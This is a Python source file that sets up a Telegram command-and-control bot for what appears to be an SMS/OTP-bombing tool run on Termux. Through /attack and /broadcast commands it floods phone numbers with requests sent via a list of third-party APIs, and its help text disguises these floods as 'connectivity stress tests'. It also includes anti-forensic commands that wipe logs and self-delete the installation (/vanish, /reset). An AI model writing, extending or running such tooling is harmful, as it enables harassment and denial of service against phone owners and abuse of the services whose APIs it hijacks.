# termux_version/core/telegram_c2.py
import telebot
import json
import os
import sys
import asyncio
import threading
import time
from .attacker import start_async_attack
from .utils import autoketik

# --- REMOTE ADMINISTRATION INTERFACE ---
BANNER = """
```
   ___  ___  __  ___  _____  ___ 
  / _ \/ _ \/  |/  / /  _/ |/ / |
 / , _/ // / /|_/ / _/ //    /| |
/_/|_/____/_/  /_/ /___/_/|_/ | |
  [ SYSTEM ONLINE :: v14000 ] | |
                              | |
```
"""

CONFIG_PATH = os.path.join(os.path.dirname(__file__), '../config/config.json')
APIS_PATH = os.path.join(os.path.dirname(__file__), '../config/apis.json')
SCHEDULE_PATH = os.path.join(os.path.dirname(__file__), '../config/schedule.json')
START_TIME = time.time()

try:
    with open(CONFIG_PATH, "r") as f:
        config = json.load(f)
        TOKEN = config.get("TELEGRAM_BOT_TOKEN")
        CHAT_ID = config.get("TELEGRAM_CHAT_ID")
except Exception as e:
    TOKEN = "DUMMY_TOKEN" 

class MockBot:
    def message_handler(self, commands=None, content_types=None, **kwargs):
        def decorator(func): return func
        return decorator
    def reply_to(self, *args, **kwargs): pass
    def infinity_polling(self, *args, **kwargs): print("⚠️ Remote Admin not configured.")
    def get_file(self, *args): raise Exception("Mock")
    def download_file(self, *args): raise Exception("Mock")
    def callback_query_handler(self, func=None, **kwargs):
        def decorator(f): return f
        return decorator
    def answer_callback_query(self, *args, **kwargs): pass

    def callback_query_handler(self, func=None, **kwargs):
        def decorator(f): return f
        return decorator
    def answer_callback_query(self, *args, **kwargs): pass

def check_auth(message):
    try:
        # If dummy token, allow all (debug) or block all?
        # Better: Check chat ID
        if str(message.chat.id) == str(CHAT_ID): return True
        # If config CHAT_ID is 0 or missing, maybe auto-learn or block?
        # For security, we block if not matched, unless CHAT_ID is empty (first run).
        if not CHAT_ID: return True 
        return False
    except: return False

if TOKEN == "DUMMY_TOKEN" or ":" not in TOKEN:
    print("⚠️ Warning: Invalid Remote Token. Remote Admin Disabled.")
    bot = MockBot()
else:
    try:
        # v5000: Threaded=False is safer for Termux resources + Rate Limiting
        bot = telebot.TeleBot(TOKEN, threaded=False)
        
        # Monkey Patch send_message to auto-sleep (Naive Rate Limiter)
        original_send = bot.send_message
        def safe_send(*args, **kwargs):
            time.sleep(0.3) # Prevent 429
            return original_send(*args, **kwargs)
        bot.send_message = safe_send
        
    except:
        bot = MockBot()
    
ATTACK_RUNNING = False
ATTACK_TASK = None
ATTACK_CONCURRENCY = 50

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    msg = f"""{BANNER}
👋 **WELCOME ADMINISTRATOR**
System is ready.

**🛠️ DIAGNOSTIC TOOLS**
• `/test [target]` : Run connectivity stress test
• `/broadcast` : Batch connectivity test
• `/stop` : Halt all processes
• `/reset` : **FACTORY RESET** (Clear Logs)

**📊 METRICS**
• `/status` : View Server Load
• `/modules` : View Loaded Modules
• `/logs` : Export System Logs
• `/update` : Pull latest patch
"""
    bot.reply_to(message, msg, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if not check_auth(call.message): return

    if call.data == "cmd_attack":
        # v2000: Race Condition Fix
        if ATTACK_RUNNING:
             bot.answer_callback_query(call.id, "⚠️ Attack Already in Progress!", show_alert=True)
             return
             
        bot.answer_callback_query(call.id, "Select Target via Chat: /attack [number]")
        bot.send_message(call.message.chat.id, "👉 Type `/attack 08xx` to launch.")
    elif call.data == "cmd_stop":
        # Call stop handler logic manually or simulate message
        handle_stop(call.message)
        bot.answer_callback_query(call.id, "Stopping...")
    elif call.data == "cmd_status":
        handle_status(call.message)
    elif call.data == "cmd_logs":
        handle_logs(call.message)
    elif call.data == "cmd_update":
        handle_update(call.message)
    elif call.data == "cmd_vanish":
         # Safety check
         bot.send_message(call.message.chat.id, "⚠️ Type `/vanish` manually to confirm destruction.")
         bot.answer_callback_query(call.id, "Safety Lock Active")

@bot.message_handler(commands=['vanish'])
def handle_vanish(message):
    if not check_auth(message): return
    
    bot.reply_to(message, "⚠️ **INITIATING PROTOCOL OMEGA**\nSystem will self-destruct in 5 seconds...")
    import time
    time.sleep(5)
    
    # v2000: Drop Poison Pill for Guardian
    with open(".vanish_lock", "w") as f:
        f.write("DEAD")
    
    # Wipe Files
    import shutil
    try:
        root_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        # Delete contents but keep folder (or delete folder too if possible)
        # On Termux we might not have permission to delete parent, but we can delete contents.
        for filename in os.listdir(root_dir):
            if filename == "guardian.sh": continue # Let guardian delete itself
            file_path = os.path.join(root_dir, filename)
            try:
                if os.path.isfile(file_path) or os.path.islink(file_path):
                    os.unlink(file_path)
                elif os.path.isdir(file_path):
                    shutil.rmtree(file_path)
            except Exception as e:
                pass
    except: pass
    
    os._exit(0)

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global ATTACK_RUNNING, ATTACK_TASK
    
    if ATTACK_RUNNING:
        bot.reply_to(message, "⚠️ **SYSTEM BUSY**\nAttack already in progress. Abort first using `/stop`.")
        return

    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "⚠️ **USAGE ERROR**\nFormat: `/attack 0812xxxx`")
            return
            
        number = parts[1]
        
        bot.reply_to(message, f"""
Target Acquired: `{number}`
🚀 **LAUNCHING OFFENSIVE**
---------------------------
⚡ **Mode**: BOOST
🎯 **Target**: `{number}`
---------------------------
""", parse_mode="Markdown")
        
        ATTACK_TASK = threading.Thread(target=run_attack_loop, args=(number,))
        ATTACK_TASK.start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ **SYSTEM FAILURE**: {e}")

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    global ATTACK_RUNNING
    if ATTACK_RUNNING:
        ATTACK_RUNNING = False
        bot.reply_to(message, "🛑 **ABORT SEQUENCE**\nStopping threads...")
    else:
        bot.reply_to(message, "💤 **SYSTEM IDLE**")

@bot.message_handler(commands=['status'])
def handle_status(message):
    from .reporter import get_stats
    import psutil
    
    count = get_stats()
    uptime = time.time() - START_TIME
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    
    cpu = psutil.cpu_percent()
    ram = psutil.virtual_memory().percent
    
    def bar(p):
        filled = int(p / 10)
        return "█" * filled + "░" * (10 - filled)
    
    status_icon = "🟢 ONLINE" if ATTACK_RUNNING else "🟠 IDLE"
    
    msg = f"""
**💻 SYSTEM HUD**
---------------------------
**STATUS**: {status_icon}
**UPTIME**: `{hours}h {minutes}m`
**TOTAL HITS**: `{count}`
---------------------------
**CPU**: `{bar(cpu)}` {cpu}%
**RAM**: `{bar(ram)}` {ram}%
"""
    bot.reply_to(message, msg, parse_mode="Markdown")

@bot.message_handler(commands=['broadcast'])
def handle_broadcast(message):
    try:
        if not message.reply_to_message or not message.reply_to_message.document:
            bot.reply_to(message, "⚠️ Reply to a .txt file containing numbers.")
            return

        file_info = bot.get_file(message.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        numbers = downloaded_file.decode().splitlines()
        numbers = [n.strip() for n in numbers if n.strip().isdigit()]
        
        if not numbers:
             bot.reply_to(message, "❌ No valid numbers found.")
             return
             
        bot.reply_to(message, f"🚀 **BROADCAST STARTED**\nTargeting {len(numbers)} numbers.")
        
        def broadcast_thread():
            for num in numbers:
                 run_attack_loop_oneshot(num)
                 time.sleep(10) 
        
        threading.Thread(target=broadcast_thread).start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['reset'])
def handle_reset(message):
    bot.reply_to(message, "⚙️ **SYSTEM RESET INITIATED**\nClearing cache...")
    try:
        log_path = os.path.join(os.path.dirname(__file__), '../logs/')
        if os.path.exists(log_path):
            for f in os.listdir(log_path):
                os.remove(os.path.join(log_path, f))
        bot.reply_to(message, "✅ **MAINTENANCE COMPLETE**. Storage optimized.")
    except Exception as e:
        bot.reply_to(message, f"❌ Reset Fail: {e}")

@bot.message_handler(commands=['logs'])
def handle_logs(message):
    try:
        log_path = os.path.join(os.path.dirname(__file__), '../logs/success.txt')
        if os.path.exists(log_path):
            with open(log_path, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="📜 **MISSION LOGS**")
        else:
            bot.reply_to(message, "⚠️ Logs are empty.")
    except Exception as e:
        bot.reply_to(message, f"❌ Log Fetch Fail: {e}")

@bot.message_handler(commands=['update'])
def handle_update(message):
    bot.reply_to(message, "🔄 **SYSTEM UPDATE INITIATED**\nPulling latest code...")
    try:
        # Git Pull
        os.system("git pull")
        bot.reply_to(message, "✅ **UPDATE COMPLETE**\nRestarting System...")
        
        # Restart Process
        os.execv(sys.executable, ['python'] + sys.argv)
    except Exception as e:
        bot.reply_to(message, f"❌ Update Fail: {e}")

def run_attack_loop(number):
    global ATTACK_RUNNING
    ATTACK_RUNNING = True
    try:
        with open(APIS_PATH, "r") as f: apis = json.load(f)
    except: return

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    while ATTACK_RUNNING:
        loop.run_until_complete(start_async_attack(apis, number, duration=60))
        # Hot reload logic inside start_async_attack handled, but loop here keeps it alive
        
    loop.close()

def run_attack_loop_oneshot(number):
    try:
        with open(APIS_PATH, "r") as f: apis = json.load(f)
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(start_async_attack(apis, number, duration=30))
        loop.close()
    except: pass

    print("✅ Telegram Bot Started")
    
    # v65: Startup Alert
    try:
        if TOKEN != "DUMMY":
             # Try to load owner ID to send greeting
             from .security import get_config
             cfg = get_config()
             oid = cfg.get("OWNER_ID")
             if oid and str(oid) != "0":
                 # bot.send_message(oid, "🐧 **SYSTEM REBOOTED**. I am online.")
                 pass
    except: pass

def start_bot():
    print("🤖 [TELEGRAM] Connecting to C2 Server...")
    try:
        if TOKEN == "DUMMY_TOKEN":
            print("⚠️ [TELEGRAM] Token missing. Bot mode disabled.")
            return
            
        bot.infinity_polling(timeout=20, long_polling_timeout=10)
    except Exception as e:
        print(f"❌ [TELEGRAM] Connection Error: {e}")
        time.sleep(5)

    
    bot.infinity_polling()
